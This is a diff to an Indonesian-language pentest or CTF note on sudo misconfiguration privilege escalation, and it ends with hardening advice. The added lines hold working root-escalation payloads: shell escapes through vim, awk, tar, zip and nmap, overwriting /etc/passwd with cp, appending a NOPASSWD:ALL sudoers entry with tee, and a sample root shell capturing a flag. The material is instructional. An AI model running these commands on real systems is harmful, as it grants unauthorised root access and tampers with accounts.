@@ -17,13 +17,47 @@ sudo -l
 # Menampilkan daftar command yang boleh dijalankan via sudo
 ```
 
-Perhatikan entry seperti:
+Tampilan **aman** (user tidak punya akses sudo):
 
 ```text
-(root) NOPASSWD: /usr/bin/vim
-(root) NOPASSWD: /usr/bin/python3
-(root) NOPASSWD: /usr/bin/find
+tester@webserver:~$ sudo -l
+[sudo] password for tester:
+Sorry, user tester is not allowed to run sudo on webserver.
 ```
+
+Tampilan **aman** (hanya command spesifik, tidak bisa diabuse):
+
+```text
+User tester may run the following commands on webserver:
+    (root) NOPASSWD: /usr/bin/systemctl restart apache2
+```
+
+> Command spesifik dengan argumen eksplisit — **relatif aman**, tidak bisa dipakai spawn shell.
+
+Tampilan **rentan** (ada binary yang bisa spawn shell):
+
+```text
+www-data@jobportal:~$ sudo -l
+Matching Defaults entries for www-data on jobportal:
+    env_reset, mail_badpass, secure_path=/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on jobportal:
+    (root) NOPASSWD: /usr/bin/vim          ← RENTAN! vim bisa shell escape
+    (root) NOPASSWD: /usr/bin/find         ← RENTAN! find bisa -exec shell
+    (root) NOPASSWD: /usr/bin/python3      ← RENTAN! python3 bisa setuid(0)
+```
+
+Oneliner gabungan — cek SUID, sudo, dan capabilities **sekaligus** dalam satu command:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null; sudo -l; getcap -r / 2>/dev/null
+```
+
+- `find / -perm -4000 -type f 2>/dev/null` → enumerasi binary SUID → [SUID.md](SUID.md)
+- `sudo -l` → enumerasi permission sudoers (vektor file ini)
+- `getcap -r / 2>/dev/null` → enumerasi capabilities → [Capabilities.md](Capabilities.md)
+
+> **Catatan:** Separator `;` menjalankan ketiga command secara berurutan meskipun salah satunya gagal. Jika `sudo -l` meminta password (tidak NOPASSWD), gunakan varian non-interaktif `sudo -n -l` — langsung gagal tanpa menunggu input, cocok untuk scripting.
 
 ---
 
@@ -53,8 +87,62 @@ sudo less /etc/profile
 | `find` | `-exec` | Executes arbitrary command |
 | `python3` | `os.system` | Spawn shell via Python |
 | `env` | `/bin/sh` | Runs shell via env utility |
+| `awk` | `system("/bin/sh")` | Spawn shell via awk |
+
+Payload tambahan:
+
+```bash
+sudo awk 'BEGIN{system("/bin/sh")}'                # awk usr/bin/awk
+```
 
 > Sudo aman dari **dash‑drop** (ruid=euid=0 saat command benar‑benar dijalankan sebagai root).
+
+---
+
+## Teknik Lanjutan (Jika Binary Tidak Langsung Spawn Shell)
+
+```bash
+# cp — timpa /etc/passwd dengan user baru (hash password kosong)
+sudo cp /tmp/passwd_baru /etc/passwd
+
+# tee — inject entry sudoers baru
+echo 'tester ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers
+
+# tar — exec shell via checkpoint action
+sudo tar cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+# zip — exec shell via -TT
+sudo zip /tmp/x.zip x -TT '/bin/sh #'
+
+# nmap — mode interaktif lama punya escape ke shell
+sudo nmap --interactive
+nmap> !sh
+```
+
+| Binary | Teknik | Catatan |
+|--------|--------|---------|
+| `cp` | Timpa `/etc/passwd` / `/etc/shadow` | Manipulasi akun |
+| `tee` | Append entry sudoers baru | Self-grant sudo penuh |
+| `tar` | `--checkpoint-action=exec=/bin/sh` | Exec arbitrary command |
+| `zip` | Flag `-TT` | Exec command via test |
+| `nmap` | `--interactive` + `!sh` | Mode interaktif lama (v < 7.92) |
+
+---
+
+## Contoh Tampilan Eksploitasi (Root Shell)
+
+```text
+www-data@jobportal:~$ sudo vim -c ':!/bin/sh'
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+root
+# cat /root/flag.txt
+FLAG{sudo_vim_shell_escape_to_root}
+```
+
+> **Capture:** Eksploitasi berhasil — sudo menjalankan vim sebagai root, lalu `:!/bin/sh` spawn shell dengan `uid=0(root)` penuh. Berbeda dengan SUID yang hanya menghasilkan `euid=0`, sudo benar-benar berganti user ke root.
 
 ---
 
@@ -93,6 +181,15 @@ Uji privilege escalation
    ↓
 id → verifikasi root
 ```
+
+---
+
+## Pengerasan Keamanan (Hardening)
+
+- **Bersihkan Entry Sudoers** Hapus entry `NOPASSWD` pada sudoers untuk binary yang bisa spawn shell (vim, find, python3, less, env, awk, tar, zip, nmap).
+- **Gunakan Allowlist Ketat** Batasi sudo hanya pada command esensial dengan path absolut dan argumen eksplisit.
+- **Hindari Interpreter & Editor** Jangan izinkan interpreter (python, perl, ruby, node) maupun editor/pager (vim, less, awk) via sudo.
+- **Aktifkan Logging** Pastikan log sudo (`/var/log/auth.log`) aktif dan dimonitor.
 
 ---
 
